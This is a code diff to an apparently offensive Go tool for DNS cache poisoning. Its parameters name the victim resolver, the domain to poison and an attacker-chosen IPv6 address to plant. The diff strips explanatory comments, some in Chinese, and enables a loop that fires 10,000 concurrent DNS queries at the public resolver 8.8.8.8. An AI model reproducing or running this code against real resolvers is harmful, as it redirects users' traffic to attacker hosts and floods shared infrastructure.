@@ -3,6 +3,11 @@ package main
 import (
 	"flag"
 	"fmt"
+	"github.com/google/gopacket"
+	"github.com/google/gopacket/layers"
+	"github.com/google/gopacket/pcap"
+	"github.com/google/gopacket/routing"
+	"github.com/miekg/dns"
 	"log"
 	"math/rand"
 	"net"
@@ -11,12 +16,6 @@ import (
 	"strings"
 	"sync"
 	"time"
-
-	"github.com/google/gopacket"
-	"github.com/google/gopacket/layers"
-	"github.com/google/gopacket/pcap"
-	"github.com/google/gopacket/routing"
-	"github.com/miekg/dns"
 )
 
 var handle *pcap.Handle
@@ -470,45 +469,39 @@ func main() {
 func Main(ifaceName string, authIPArg net.IP, resolverIPArg net.IP, resolverBackendIPArg net.IP, startPort uint, endPort uint, victimDNSNameArg string, dnsQueryTimeout uint,
 	defaultJitterArg uint, attackerMaliciousDomainArg string, resolverBackendList string, debugOutputArg bool, repeatTimesArg uint, timeGapArg uint, attackertargetIP string,
 	soaNameArg string, isfake int) {
-	fmt.Println("/***Please make sure to fill every argument carefully and correct. Otherwise the program will crash.***/")
+	// fmt.Println("/***Please make sure to fill every argument carefully and correct. Otherwise the program will crash.***/")
 	// 特殊用途
 	if isfake == 1 {
 		c := new(dns.Client)
 		msg := new(dns.Msg)
-		if strings.Contains(attackertargetIP, ":") { // attackertargetIP -- 攻击者要更改到的IPv6地址
-			println("目标：" + resolverBackendIPArg.String()) // resolverBackendIPArg -- Back-end IP of the victim resolver
+		if strings.Contains(attackertargetIP, ":") {
+			println("目标："+resolverBackendIPArg.String())
 			ipcode := strings.ReplaceAll(attackertargetIP, ":", "-")
-			if victimDNSNameArg[len(victimDNSNameArg)-1:] != "." { // victimDNSNameArg -- The domain name to be poisoned
+			if victimDNSNameArg[len(victimDNSNameArg)-1:] != "." {
 				victimDNSNameArg = victimDNSNameArg + "."
 			}
 			domain := ipcode + "." + victimDNSNameArg
-
-			fmt.Println("查询的目标域名：" + domain)
-
 			msg.SetQuestion(domain, dns.TypeAAAA)
-			_, _, _ = c.Exchange(msg, net.JoinHostPort(resolverBackendIPArg.String(), "53"))
+			_, _, _ = c.Exchange(msg, net.JoinHostPort(resolverBackendIPArg.String(),"53"))
 			return
 		} else {
 			println(attackertargetIP)
 			println(victimDNSNameArg)
 			println("参数有误，请输入IPv6地址作为篡改目标结果")
 		}
-	} else {
-		c := new(dns.Client)
-		msg := new(dns.Msg)
-		// domain := "www.google.com."
-		// msg.SetQuestion(domain, dns.TypeAAAA)
-		// for i := 0; i < 10000; i++ {
-		// 	go func() {
-		// 		_, _, _ = c.Exchange(msg, net.JoinHostPort("8.8.8.8", "53"))
-		// 	}()
-		// }
-		domain := "daffteg." + victimDNSNameArg
-		msg.SetQuestion(domain, dns.TypeAAAA)
-		_, _, _ = c.Exchange(msg, net.JoinHostPort(resolverBackendIPArg.String(), "53"))
-		return
-	}
 
+	}else{
+		c := new(dns.Client)
+                msg := new(dns.Msg)
+                domain := "www.google.com."
+                msg.SetQuestion(domain, dns.TypeAAAA)
+		for i:=0;i<10000;i++{
+			go func(){
+                	_, _, _ = c.Exchange(msg, net.JoinHostPort("8.8.8.8","53"))
+			}()
+		}
+               	return
+	}
 	rand.Seed(time.Now().UnixNano())
 	handle, _ = pcap.OpenLive(
 		ifaceName,
